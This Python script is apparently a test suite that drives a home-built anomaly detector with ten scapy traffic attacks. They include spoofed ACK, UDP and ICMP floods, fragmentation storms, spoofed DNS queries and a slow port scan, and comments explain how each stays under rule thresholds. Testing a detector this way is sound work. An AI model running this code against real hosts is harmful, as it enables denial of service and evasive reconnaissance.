"""
zero_day_attacks.py — Zero-Day / Anomaly Attack Test Suite
============================================================
These attacks have NO matching rule in main.py.
They are ONLY detectable by the zero-day anomaly detector
(statistical baseline comparison using z-scores).

Each attack creates unusual traffic behavior that deviates
from the learned baseline across multiple features:
  pkt_count, byte_count, unique_dsts, unique_dports,
  syn_count, udp_count, icmp_count, avg_pkt_size, dst_entropy

IMPORTANT: Wait for main.py to finish baseline learning
(180 seconds) before running these attacks.
Watch: http://127.0.0.1:8090/api/zero-day-stats
       baseline_ready must be true before testing.

Usage:
  sudo $(which python) zero_day_attacks.py --target 172.20.10.2 --attack list
  sudo $(which python) zero_day_attacks.py --target 172.20.10.2 --attack 1 --iface wlan0
  sudo $(which python) zero_day_attacks.py --target 172.20.10.2 --attack all --iface wlan0

WARNING: Only run on systems and networks you own and control.
"""

import argparse
import time
import random
import subprocess
import re
from scapy.all import (
    IP, TCP, UDP, ICMP, Raw, Ether,
    sendp, fragment, conf, get_if_hwaddr
)
conf.verb = 0

IFACE  = "wlan0"
GW_MAC = None
MY_MAC = None


# =============================================================================
# HELPERS
# =============================================================================

def rand_ip():
    return (f"{random.randint(1,254)}.{random.randint(1,254)}."
            f"{random.randint(1,254)}.{random.randint(1,254)}")

def rand_port():
    return random.randint(1024, 65535)

def status(msg):
    print(f"  -> {msg}")

def resolve_macs(iface, target):
    global GW_MAC, MY_MAC
    try:
        MY_MAC = get_if_hwaddr(iface)
        print(f"  Own MAC    : {MY_MAC}")
    except Exception:
        MY_MAC = "02:00:00:00:00:01"
        print(f"  Own MAC    : fallback {MY_MAC}")
    subprocess.call(["ping", "-c", "1", "-W", "1", target],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        out = subprocess.check_output(["arp", "-n"], text=True)
        for line in out.splitlines():
            if target in line:
                m = re.search(r"([0-9a-f]{2}[:\-]){5}[0-9a-f]{2}", line, re.I)
                if m:
                    GW_MAC = m.group(0)
                    print(f"  Target MAC : {GW_MAC}")
                    return
    except Exception:
        pass
    GW_MAC = "ff:ff:ff:ff:ff:ff"
    print("  Target MAC : broadcast fallback")

def xsend(pkt):
    sendp(Ether(src=MY_MAC, dst=GW_MAC) / pkt, iface=IFACE, verbose=False)

def print_header(num, name, target, anomalies, extra=""):
    print(f"\n{'='*60}")
    print(f"  [{num}] {name}")
    print(f"  Target         : {target}  {extra}")
    print(f"  Anomalies      : {anomalies}")
    print(f"  Expected alert : ZERO_DAY")
    print(f"  No rule matches this — only anomaly detector catches it")
    print(f"{'='*60}")


# =============================================================================
# ATTACK 1 — ACK Flood with Spoofed Source (No SYN)
# Anomaly: very high pkt_count, syn_count=0, high dst_entropy
# Why no rule fires: ACK_FLOOD checks is_ack_only but our ACKs come
# from random IPs so each IP stays just under the per-IP threshold.
# Zero-day catches the aggregate behavior.
# =============================================================================
def attack_distributed_ack(target, duration=60, pps=50, sources=20):
    """
    Anomalies triggered:
      - pkt_count     : elevated across many IPs
      - syn_count = 0 : all ACK, no SYN — unusual pattern
      - dst_entropy   : high — random ports
    """
    print_header(1, "Distributed Low-Rate ACK Flood", target,
                 "pkt_count spike, syn_count=0, high dst_entropy",
                 f"sources={sources}  pps={pps}  duration={duration}s")
    status("Many different IPs each sending ACKs slowly — under per-IP threshold")
    status("No single IP exceeds ACK_FLOOD threshold — only anomaly sees the pattern")

    src_pool = [rand_ip() for _ in range(sources)]
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        src = random.choice(src_pool)
        xsend(IP(src=src, dst=target) /
              TCP(sport=rand_port(), dport=rand_port(), flags="A",
                  seq=random.randint(0, 2**32 - 1),
                  ack=random.randint(0, 2**32 - 1)))
        count += 1
        if count % 200 == 0:
            status(f"Sent {count} packets from {sources} rotating IPs...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} distributed ACK packets.")


# =============================================================================
# ATTACK 2 — IP Fragmentation Storm
# Anomaly: extreme byte_count vs pkt_count ratio, high avg_pkt_size
# Why no rule fires: Fragmented packets — no port scan, no flood threshold crossed
# =============================================================================
def attack_fragmentation_storm(target, count=300):
    """
    Anomalies triggered:
      - byte_count    : very high (3000 bytes per datagram, fragmented)
      - avg_pkt_size  : much larger than baseline
      - pkt_count     : elevated (many fragments per datagram)
    """
    print_header(2, "IP Fragmentation Storm", target,
                 "high byte_count, extreme avg_pkt_size",
                 f"datagrams={count}")
    status("Large UDP payloads fragmented into 64-byte pieces")
    status("Each fragment looks innocent — no rule matches fragmented traffic")
    for i in range(count):
        payload = Raw(load="X" * random.randint(1000, 3000))
        pkt = (IP(src=rand_ip(), dst=target) /
               UDP(sport=rand_port(), dport=rand_port()) /
               payload)
        for frag in fragment(pkt, fragsize=64):
            xsend(frag)
        if i % 50 == 0:
            status(f"Sent {i}/{count} datagrams ({i*20}+ fragments)...")
        time.sleep(0.02)
    print(f"  [DONE] Sent {count} fragmented datagrams.")


# =============================================================================
# ATTACK 3 — Large UDP Payload Flood (non-scan)
# Anomaly: extreme avg_pkt_size, high byte_count
# Why no rule fires: not scanning ports (one dport), below DoS threshold
# =============================================================================
def attack_large_udp(target, duration=30, pps=80):
    """
    Anomalies triggered:
      - avg_pkt_size  : 4096-8192 bytes vs normal ~200 bytes baseline
      - byte_count    : extremely high
      - udp_count     : elevated
    """
    print_header(3, "Large UDP Payload Flood", target,
                 "extreme avg_pkt_size, high byte_count, high udp_count",
                 f"pps={pps}  duration={duration}s  payload=4-8KB")
    status("Sending 4-8KB UDP packets to one port — not a scan")
    status("No rule fires — below DoS threshold, not scanning ports")
    status("Anomaly: avg_pkt_size will be 20x higher than baseline")
    dport = random.randint(1024, 9000)
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) /
              UDP(sport=rand_port(), dport=dport) /
              Raw(load="A" * random.randint(4096, 8192)))
        count += 1
        if count % 100 == 0:
            status(f"Sent {count} large UDP packets...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} large UDP packets.")


# =============================================================================
# ATTACK 4 — Oversized ICMP (Ping of Death style)
# Anomaly: extreme avg_pkt_size, high icmp_count
# Why no rule fires: ICMP_SCAN counts unique targets — this is one target
# =============================================================================
def attack_oversized_icmp(target, count=100):
    """
    Anomalies triggered:
      - avg_pkt_size  : very large (5000-15000 bytes per ICMP)
      - icmp_count    : elevated
      - byte_count    : very high
    """
    print_header(4, "Oversized ICMP Flood", target,
                 "extreme avg_pkt_size, high icmp_count, high byte_count",
                 f"packets={count}  payload=5-15KB each")
    status("ICMP with 5-15KB payloads — sent to ONE target (not a scan)")
    status("ICMP_SCAN rule counts unique targets — this hits only one target")
    status("Anomaly: avg_pkt_size and icmp_count both spike")
    for i in range(count):
        pkt = (IP(src=rand_ip(), dst=target) /
               ICMP() /
               Raw(load="P" * random.randint(5000, 15000)))
        for f in fragment(pkt, fragsize=1480):
            xsend(f)
        if i % 20 == 0:
            status(f"Sent {i}/{count} oversized ICMP packets...")
        time.sleep(0.1)
    print(f"  [DONE] Sent {count} oversized ICMP messages.")


# =============================================================================
# ATTACK 5 — DNS Amplification Simulation
# Anomaly: low dst_entropy (all port 53), high udp_count, many unique_dsts
# Why no rule fires: UDP scan checks many dports — this uses ONE dport (53)
# =============================================================================
def attack_dns_amplification(target, count=400):
    """
    Anomalies triggered:
      - dst_entropy   : very LOW — all packets go to port 53 (opposite of scan)
      - udp_count     : high
      - unique_dsts   : many different sources pretending to be victims
    """
    print_header(5, "DNS Amplification Simulation", target,
                 "LOW dst_entropy (all port 53), high udp_count",
                 f"packets={count}  dport=53")
    status("Many spoofed IPs sending DNS queries to port 53")
    status("UDP_SCAN looks for many dports from one IP — this is one dport from many IPs")
    status("Anomaly: dst_entropy near 0 (all same port) is unusual — baseline is spread")
    dns_q = (b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
             b"\x07example\x03com\x00\x00\xff\x00\x01")
    for i in range(count):
        xsend(IP(src=rand_ip(), dst=target) /
              UDP(sport=rand_port(), dport=53) /
              Raw(load=dns_q))
        if i % 80 == 0:
            status(f"Sent {i}/{count} DNS queries...")
        time.sleep(0.04)
    print(f"  [DONE] Sent {count} DNS amplification packets.")


# =============================================================================
# ATTACK 6 — Low-and-Slow Port Reconnaissance
# Anomaly: high dst_entropy over time despite low pkt_count per window
# Why no rule fires: 1 packet every 2 seconds — ALL pps thresholds missed
# =============================================================================
def attack_low_and_slow(target, ports=150, delay=2.0):
    """
    Anomalies triggered:
      - dst_entropy   : high — many unique dports scanned
      - unique_dports : high relative to pkt_count
      - syn_count     : present but very low rate
    This is the hardest attack to detect — only time-windowed anomaly catches it.
    Expected time: ~5 minutes for 150 ports.
    """
    print_header(6, "Low-and-Slow Reconnaissance", target,
                 "high dst_entropy, high unique_dports/pkt_count ratio",
                 f"ports={ports}  delay={delay}s  (~{ports*delay//60:.0f} min)")
    status("1 SYN every 2 seconds — completely invisible to all pps-based rules")
    status("Over time the feature bucket accumulates high unique_dports")
    status("Anomaly: dst_entropy and unique_dports/pkt_count ratio becomes unusual")
    status(f"This will take approximately {ports*delay/60:.1f} minutes...")
    src_ip = rand_ip()
    port_list = random.sample(range(1, 65535), min(ports, 65534))
    for i, dport in enumerate(port_list):
        xsend(IP(src=src_ip, dst=target) /
              TCP(sport=rand_port(), dport=dport, flags="S"))
        if i % 10 == 0:
            status(f"Scanned {i}/{ports} ports (slowly)...")
        time.sleep(delay)
    print(f"  [DONE] Slow scan of {ports} ports complete.")


# =============================================================================
# ATTACK 7 — Protocol Anomaly: TCP with unusual flag combinations
# Anomaly: pkt_count spike with zero syn_count AND zero ack_count
# Why no rule fires: Not enough volume for flood rules, not a scan
# =============================================================================
def attack_protocol_anomaly(target, duration=40, pps=120):
    """
    Anomalies triggered:
      - pkt_count     : elevated
      - syn_count = 0 : no SYN in any packet
      - No matching flag pattern for any rule
    Sends random exotic TCP flag combinations:
    FIN only, URG only, PSH only, FIN+URG, etc.
    """
    print_header(7, "TCP Protocol Anomaly", target,
                 "elevated pkt_count, syn_count=0, unusual flag mix",
                 f"pps={pps}  duration={duration}s")
    status("Random unusual TCP flag combinations — FIN, URG, PSH in strange mixes")
    status("Not enough volume for flood rules, not a scan — pure anomaly")

    # Unusual flag combinations that no rule checks for
    exotic_flags = ["FU", "PU", "F", "U", "FP", "PFU"]
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        flags = random.choice(exotic_flags)
        xsend(IP(src=rand_ip(), dst=target) /
              TCP(sport=rand_port(), dport=rand_port(), flags=flags))
        count += 1
        if count % 200 == 0:
            status(f"Sent {count} protocol anomaly packets...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} protocol anomaly packets.")


# =============================================================================
# ATTACK 8 — Burst Traffic Spike
# Anomaly: sudden pkt_count and byte_count spike from one IP
# Why no rule fires: below DoS threshold (< 500 pps) but far above baseline
# =============================================================================
def attack_traffic_burst(target, bursts=5, burst_pps=400, burst_duration=8):
    """
    Anomalies triggered:
      - pkt_count     : sudden spike (400 pps vs baseline ~10-50 pps)
      - byte_count    : large spike
      - All protocols mixed to avoid triggering specific flood rules
    """
    print_header(8, "Traffic Burst Spike", target,
                 "pkt_count spike, byte_count spike",
                 f"bursts={bursts}  burst_pps={burst_pps}  burst_duration={burst_duration}s")
    status(f"Sending {burst_pps} pps bursts (below DoS threshold of 500)")
    status("Baseline is ~10-50 pps so this is a 10x-40x spike")
    status("Mixes TCP/UDP to avoid protocol-specific flood rules")

    for burst in range(bursts):
        status(f"Burst {burst+1}/{bursts} starting...")
        end_time = time.time() + burst_duration
        count = 0
        while time.time() < end_time:
            # Mix protocols to avoid any single flood rule
            r = random.random()
            if r < 0.4:
                xsend(IP(src=rand_ip(), dst=target) /
                      TCP(sport=rand_port(), dport=rand_port(), flags="A",
                          seq=random.randint(0, 2**32-1)))
            elif r < 0.7:
                xsend(IP(src=rand_ip(), dst=target) /
                      UDP(sport=rand_port(), dport=rand_port()) /
                      Raw(load="X" * random.randint(100, 500)))
            else:
                xsend(IP(src=rand_ip(), dst=target) /
                      TCP(sport=rand_port(), dport=rand_port(), flags="F"))
            count += 1
            time.sleep(1.0 / burst_pps)
        status(f"Burst {burst+1} done — sent {count} packets. Pausing 15s...")
        time.sleep(15)  # pause between bursts
    print(f"  [DONE] All {bursts} traffic bursts complete.")


# =============================================================================
# ATTACK 9 — Port Knocking Probe
# Anomaly: very specific unusual port sequence, low pkt_count, unique_dports
# Why no rule fires: only 5 packets total — nothing crosses any threshold
# =============================================================================
def attack_port_knocking(target, rounds=10):
    """
    Anomalies triggered:
      - unique_dports : specific pattern of ports
      - dst_entropy   : unusual entropy for just a few packets
    Repeated across 10 rounds to accumulate enough data for the bucket.
    """
    print_header(9, "Port Knocking Probe", target,
                 "unusual port sequence, unique dst_entropy pattern",
                 f"rounds={rounds}")
    status("Specific secret port sequence repeated 10 times")
    status("Only 5 packets per round — no rule threshold reached")
    status("Anomaly detector sees the unusual port pattern over time")

    sequence = [7000, 8000, 9000, 7001, 8001, 6000, 5000, 4321, 1234, 9876]
    src_ip = rand_ip()
    for r in range(rounds):
        for port in sequence:
            xsend(IP(src=src_ip, dst=target) /
                  TCP(sport=rand_port(), dport=port, flags="S"))
            time.sleep(0.3)
        status(f"Round {r+1}/{rounds} complete. Waiting 5s...")
        time.sleep(5)
    print(f"  [DONE] Port knocking probe complete ({rounds} rounds).")


# =============================================================================
# ATTACK 10 — Mixed Protocol Flood (below all thresholds)
# Anomaly: pkt_count spike across all protocols simultaneously
# Why no rule fires: each protocol stays below its own threshold
# =============================================================================
def attack_mixed_protocol(target, duration=45, pps=350):
    """
    Anomalies triggered:
      - pkt_count     : high combined across protocols
      - syn_count     : some SYN but not enough for SYN flood
      - udp_count     : some UDP but not enough for UDP flood
      - icmp_count    : some ICMP
    Each individual protocol is below its threshold but combined it's anomalous.
    """
    print_header(10, "Mixed Protocol Flood", target,
                 "high combined pkt_count, elevated across all protocols",
                 f"pps={pps}  duration={duration}s")
    status(f"Sending {pps} pps mixed TCP/UDP/ICMP")
    status("Each protocol individually stays below its threshold")
    status("Combined pkt_count and cross-protocol pattern is anomalous")

    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        r = random.random()
        if r < 0.33:
            # TCP SYN (stays below DOS_PPS_THRESHOLD because mixed with other protocols)
            xsend(IP(src=rand_ip(), dst=target) /
                  TCP(sport=rand_port(), dport=rand_port(), flags="S"))
        elif r < 0.66:
            # UDP (stays below UDP DoS threshold)
            xsend(IP(src=rand_ip(), dst=target) /
                  UDP(sport=rand_port(), dport=rand_port()) /
                  Raw(load="X" * random.randint(50, 200)))
        else:
            # ICMP (stays below ICMP scan because hitting same target)
            xsend(IP(src=rand_ip(), dst=target) / ICMP())
        count += 1
        if count % 500 == 0:
            status(f"Sent {count} mixed packets...")
        time.sleep(1.0 / pps)
    print(f"  [DONE] Sent {count} mixed protocol packets.")


# =============================================================================
# ATTACK TABLE
# =============================================================================
ATTACKS = {
    "1":  ("Distributed Low-Rate ACK Flood",   attack_distributed_ack),
    "2":  ("IP Fragmentation Storm",            attack_fragmentation_storm),
    "3":  ("Large UDP Payload Flood",           attack_large_udp),
    "4":  ("Oversized ICMP Flood",              attack_oversized_icmp),
    "5":  ("DNS Amplification Simulation",      attack_dns_amplification),
    "6":  ("Low-and-Slow Reconnaissance",       attack_low_and_slow),
    "7":  ("TCP Protocol Anomaly",              attack_protocol_anomaly),
    "8":  ("Traffic Burst Spike",               attack_traffic_burst),
    "9":  ("Port Knocking Probe",               attack_port_knocking),
    "10": ("Mixed Protocol Flood",              attack_mixed_protocol),
}

# Quick attacks (< 2 minutes each) — safe for 'all' mode
QUICK_GROUP = ["1", "2", "3", "4", "5", "7", "8", "9", "10"]
# Attack 6 (low-and-slow) takes ~5 minutes — run separately


# =============================================================================
# MAIN
# =============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Zero-Day Attack Test Suite — tests anomaly detector in main.py"
    )
    parser.add_argument("--target",  default=None,
                        help="Target IP  e.g. 172.20.10.2")
    parser.add_argument("--attack",  required=True,
                        help="1-10 | all | list")
    parser.add_argument("--iface",   default="wlan0",
                        help="Network interface  e.g. wlan0, eth0")
    args = parser.parse_args()

    IFACE      = args.iface
    conf.iface = args.iface

    # ── List mode ────────────────────────────────────────────
    if args.attack == "list":
        print("\n  Zero-Day Attack Test Suite — Available Attacks")
        print("  " + "-"*65)
        print(f"  {'Key':<5} {'Name':<38} {'Main Anomalies'}")
        print("  " + "-"*65)
        anomalies = {
            "1":  "pkt_count, syn_count=0, dst_entropy",
            "2":  "avg_pkt_size, byte_count",
            "3":  "avg_pkt_size, byte_count, udp_count",
            "4":  "avg_pkt_size, icmp_count, byte_count",
            "5":  "LOW dst_entropy, udp_count",
            "6":  "dst_entropy, unique_dports/pkt_count",
            "7":  "pkt_count, syn_count=0, flag mix",
            "8":  "pkt_count spike, byte_count spike",
            "9":  "port sequence pattern, dst_entropy",
            "10": "combined pkt_count across protocols",
        }
        for key, (name, _) in ATTACKS.items():
            slow = "  [~5 min]" if key == "6" else ""
            print(f"  {key:<5} {name:<38} {anomalies.get(key,'')}{slow}")
        print()
        print("  All attacks expected to trigger: ZERO_DAY alert")
        print("  Prerequisite: baseline_ready=true (wait 180s after main.py starts)")
        print()
        raise SystemExit(0)

    if not args.target:
        print("Error: --target required.  e.g. --target 172.20.10.2")
        raise SystemExit(1)

    print("\n" + "="*60)
    print("  Zero-Day Attack Test Suite")
    print("="*60)
    print(f"  Target    : {args.target}")
    print(f"  Attack    : {args.attack}")
    print(f"  Interface : {args.iface}")
    print("  WARNING   : Only use on networks you own and control.")
    print("="*60)
    print()
    print("  IMPORTANT: Make sure main.py baseline is ready before testing!")
    print("  Check: curl http://127.0.0.1:8090/api/zero-day-stats")
    print("         baseline_ready must be true")
    print()
    print("  Resolving MACs...")
    resolve_macs(args.iface, args.target)
    print()

    if args.attack == "all":
        print("  Running all quick zero-day attacks (skipping attack 6 — too slow)...\n")
        for key in QUICK_GROUP:
            name, func = ATTACKS[key]
            func(args.target)
            print(f"\n  Waiting 15s before next attack (let bucket flush)...")
            time.sleep(15)

    elif args.attack in ATTACKS:
        ATTACKS[args.attack][1](args.target)

    else:
        print(f"  Unknown attack '{args.attack}'.")
        print("  Use --attack list  to see all options.")
        raise SystemExit(1)

    print("\n" + "="*60)
    print("  All done.")
    print("  Check http://127.0.0.1:8090/attacks for ZERO_DAY alerts.")
    print("  Check http://127.0.0.1:8090/api/zero-day-stats for baseline info.")
    print("="*60)